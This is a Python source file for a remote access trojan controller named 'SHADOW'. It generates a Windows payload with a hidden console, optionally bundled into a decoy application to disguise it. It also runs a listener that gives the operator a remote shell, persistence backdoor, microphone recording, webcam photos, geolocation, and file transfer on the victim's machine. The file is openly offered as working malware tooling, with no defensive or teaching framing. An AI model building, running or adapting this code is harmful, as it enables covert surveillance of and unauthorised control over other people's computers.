import PyInstaller.__main__
import os
import shutil
import argparse
import struct
import socket
import pyfiglet
import random
from colorama import Fore, init
from threading import *
from cryptography.fernet import Fernet

def encrypt(data): return fernet.encrypt(data)
def decrypt(data): return fernet.decrypt(data)

init(autoreset=True)

parser = argparse.ArgumentParser(description="Create Payload To Windows Or Listen To Payload")

parser.add_argument('-i', '--ip', type=str, help='Connection Address')
parser.add_argument('-p', '--port', type=int, help='Connection Port')
parser.add_argument('-a', '--app', type=str, help='Application Template')
parser.add_argument('-t', '--type', type=str, help='Payload Type (py or exe)')
parser.add_argument('-l', '--listen', action='store_true', help='Listen To Payload')
parser.add_argument('-g', '--generate', action='store_true', help='Generate Auth Code And Key')

args = parser.parse_args()

if not args.generate and (not args.ip or not args.port):
    parser.print_usage()
    exit(0)

ip = args.ip
port = args.port

auth_code = b""
KEY = b""

current_directory = os.getcwd()
payload_folder = "payloads"
payload_name = "payload.py"
payload_path = os.path.join(current_directory, payload_folder, payload_name)
settings_folder = "settings"
auth_file = "auth_code"
key_file = "key"
auth_path = os.path.join(current_directory, settings_folder, auth_file)
key_path = os.path.join(current_directory, settings_folder, key_file)

line_char = '#'
line_size = 57
headerfont = 'ansi_shadow'
version = "Version 1.0"
version_text = f"                       {version}\n"

if args.generate:
    with open(auth_path, 'wb') as auth_f:
        auth_code = Fernet.generate_key()
        auth_f.write(auth_code)
        auth_f.close()
    with open(key_path, 'wb') as key_f:
        KEY = Fernet.generate_key()
        key_f.write(KEY)
        key_f.close()
    print(Fore.LIGHTCYAN_EX + "[+] Completed Generating")
else:
    with open(auth_path, 'rb') as auth_f:
        auth_code = auth_f.read()
        auth_f.close()
    with open(key_path, 'rb') as key_f:
        KEY = key_f.read()
        key_f.close()
fernet = Fernet(KEY)

def printheader():
    header = pyfiglet.figlet_format(" SHADOW", font=headerfont)
    print(Fore.LIGHTRED_EX + " " + line_char * line_size + f'\n')
    print(Fore.LIGHTRED_EX + header)
    print(Fore.LIGHTMAGENTA_EX + version_text)
    print(Fore.LIGHTRED_EX + " " + line_char * line_size)

def clear_screen():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear") 

def recv_data(conn):
    try:
        size_data = conn.recv(4)
        if not size_data or len(size_data) < 4:
            print(Fore.LIGHTRED_EX + "[-] Session Closed!")
            exit(0)
        size = struct.unpack('>I', size_data)[0]
        data = conn.recv(size)
        if not data or len(data) < size:
            print(Fore.LIGHTRED_EX + "[-] Session Closed!")
            exit(0)
        return decrypt(data)
    except Exception as e:
        print(Fore.LIGHTRED_EX + "[!] Error: {}".format(e))
        exit(0)

def geo(conn, address):
    conn.send(encrypt(b"MODE_GEO"))
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + "[+] Location Info:\n", data.decode())
def mic(conn, address):
    number = random.randint(0, 9999999)
    print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
    conn.send(encrypt(b"MODE_MIC"))
    data = recv_data(conn)
    with open(f"records/record{number}.wav", "wb") as f:
        f.write(data)
        f.close()
    print(Fore.LIGHTCYAN_EX + f"[+] Recorded Mic: records/record{number}.wav")
def shell(conn, address):
    conn.send(encrypt(b"MODE_SHELL"))
    try:
        print(decrypt(conn.recv(1024)).decode())
        while True:
            cmd = input(Fore.LIGHTMAGENTA_EX + "$ ")
            if not cmd.strip():
                continue
            conn.send(encrypt(cmd.encode()))
            if cmd == 'exit':
                clear_screen()
                break
            if cmd == 'clear':
                clear_screen()
            try:
                output = recv_data(conn)
                print(Fore.LIGHTGREEN_EX + output.decode(errors='ignore'))
            except Exception as e:
                print(Fore.LIGHTRED_EX + f"[!] Error: {e}")
                break
    except Exception as e:
        print(Fore.LIGHTRED_EX + f"[!] Error In Shell Mode: {e}")
def upload(conn, address):
    path = input("File Path: ")
    name = input("Destination File Name: ")
    try:
        with open(path, 'rb') as f:
            data = f.read()
        conn.send(encrypt(b"MODE_UPLOAD"))
        conn.send(encrypt(name.encode()))

        control = recv_data(conn)
        conn.send(encrypt(data))
        print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
    except Exception as error:
        print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
def download(conn, address):
    conn.send(encrypt(b"MODE_DOWNLOAD"))
    path = input("File Path: ")
    name = input("Destination File Name: ")
    conn.send(encrypt(path.encode()))
    try:
        conn.send(encrypt(b'control'))

        data = recv_data(conn)
        with open(name, 'w') as f:
            f.write(data)
    except Exception as error: 
        print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
def cam(conn, address):
    number = random.randint(0, 9999999)
    print(Fore.LIGHTCYAN_EX + "[+] Info: Starting")
    conn.send(encrypt(b"MODE_CAM"))
    data = recv_data(conn)
    with open(f"photos/photo{number}.jpg", "wb") as f:
        f.write(data)
    print(Fore.LIGHTCYAN_EX + f"[+] Taked Photo: photos/photo{number}.jpg")
def backdoor(conn, address):
    conn.send(encrypt(b"MODE_BACKDOOR"))
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + f"[+] Created Backdoor")
def delete(conn, address):
    conn.send(encrypt(b"MODE_DEL"))
    data = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + "[+] Destroyed Backdoor")
def agentinfo(conn, address):
    print(Fore.LIGHTGREEN_EX + f"IP : {address[0]} PORT : {str(address[1])}")
def menu(conn, address):
    while True:
        printheader()
        print(Fore.LIGHTCYAN_EX + main_options)
        command = input(">>> ")
        if command == "q": break
        if command == "clear": os.system("cls")
        clear_screen()
        func = options.get(command)
        if func: func(conn, address)
        else: clear_screen()
def main():
    print(Fore.LIGHTCYAN_EX + "[+] Starting...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((args.ip, args.port))
    s.listen(1)
    conn, address = s.accept()
    print(Fore.LIGHTCYAN_EX + '[+] Waiting Session...')
    print(Fore.LIGHTCYAN_EX + '[+] Session Started... Session Info : ', Fore.LIGHTGREEN_EX + address[0] + Fore.LIGHTGREEN_EX + ':' + Fore.LIGHTGREEN_EX + str(address[1]))
    conn.send(encrypt(auth_code))
    menu(conn, address)
options = {
    "1": shell,
    "2": backdoor,
    "3": mic,
    "4": upload,
    "5": cam,
    "6": geo,
    "7": delete,
    "8": agentinfo
    }
main_options = """
            1 - Shell
            2 - Backdoor
            3 - Record Mic
            4 - Upload File
            5 - Cam
            6 - Get Location
            7 - Destroy Backdoor
            8 - Agent Info
            q - Quit
"""
if(args.listen):
    main()
elif args.type:
    with open(payload_path, 'r', encoding='utf-8') as payload:
        try:
            content = payload.read()
            new_content = content

            new_content = new_content.replace("__ipaddr__", ip)
            new_content = new_content.replace("12345", str(port))
            new_content = new_content.replace("'authcode'", (str(auth_code)))
            new_content = new_content.replace("'RANDOM_KEY'", str(KEY))
            if args.app:
                new_content = new_content.replace("app.exe", args.app)
                new_content = new_content.replace("use_app = False", "use_app = True")
            payload.close()
        except Exception as error:
            print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
    with open("temp.py", 'w', encoding='utf-8') as file:
        if args.type == 'py':
            with open("payload.py", 'w', encoding='utf-8') as py_payload:
                try:
                    py_payload.write(new_content)
                    print(Fore.LIGHTCYAN_EX + "Building Complete!")
                    file.close()
                    os.remove("temp.py")
                    py_payload.close()
                except Exception as error:
                    print(Fore.LIGHTRED_EX + "[!] Error: {error}")
        elif args.type == 'exe':
            try:
                file.write(new_content)
                print(Fore.LIGHTCYAN_EX + "[+] Created Payload...")
                print(Fore.LIGHTCYAN_EX + "[+] Building Payload...")
                if args.app :options = [
                    'temp.py',
                    '--onefile',
                    '--noconsole',
                    f'--add-data={args.app}:.'
                ]
                else:
                    options = [
                    'temp.py',
                    '--onefile',
                    '--noconsole']
                payload_dir = os.getcwd() + "\\" + "payload.exe"
                file.close()
                PyInstaller.__main__.run(options)

                shutil.copy("dist/temp.exe", "payload.exe")
                shutil.rmtree("build")
                shutil.rmtree("dist")
                os.remove("temp.spec")
                os.remove("temp.py")
                print(Fore.LIGHTCYAN_EX + "[+] Build Complete!")
                print(Fore.LIGHTYELLOW_EX + f"[+] /{payload_dir}")
            except Exception as error:
                print(Fore.LIGHTRED_EX + "[-] Errror: {}".format(error))
        else:
            print(Fore.LIGHTRED_EX + f"[!] Error: Invalid Output Type {args.type}")
        file.close()